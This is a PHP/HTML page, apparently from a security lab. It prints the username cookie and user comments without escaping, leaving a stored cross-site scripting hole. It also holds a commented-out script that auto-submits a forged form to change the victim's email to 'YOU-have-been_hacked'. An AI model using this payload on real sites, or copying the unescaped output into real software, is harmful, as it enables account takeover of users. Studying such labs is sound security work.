<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>index</title>
</head>
<body>
    <h2>Hello you are  <a href="./email_change.php"><?=($_COOKIE["username"]) ?></a>!!</h2>
    
    <h2>comment box</h2>
    <form action="" method="post">
        <input type="textarea" placeholder="comment something" name="comment">
        <input type="hidden" name="add_comment" value="1">
        <input type="submit">
    </form>
    
    <div id="comment-section">
        <?php foreach ($comments as $comment): ?>
            <?= $comment["comment"] ?>
        <?php endforeach; ?>
    </div>


    <!-- <script>
        function createForm() {
            const form = document.createElement("form");
            form.setAttribute("method", "post");
            form.setAttribute("action", "/attack/email_change.php");
            form.setAttribute("id", "attack-form");

            const input_email = document.createElement("input");
            input_email.setAttribute("type", "text");
            input_email.setAttribute("name", "new_email");
            input_email.setAttribute("value", "YOU-have-been_hacked");

            const input_action = document.createElement("input");
            input_action.setAttribute("type", "text");
            input_action.setAttribute("name", "email_change");
            input_action.setAttribute("value", "1");

            const submitButton = document.createElement("button");
            submitButton.setAttribute("type", "submit");
            submitButton.textContent = "Submit";

            form.appendChild(input_email);
            form.appendChild(input_action);
            form.appendChild(submitButton);

            const commentSection = document.getElementById("comment-section");
            commentSection.appendChild(form);
        }

        function submitForm(){
            const form = document.getElementById("attack-form");
            form.submit();
        }

        createForm();
        submitForm();
    </script> -->
</body>
</html>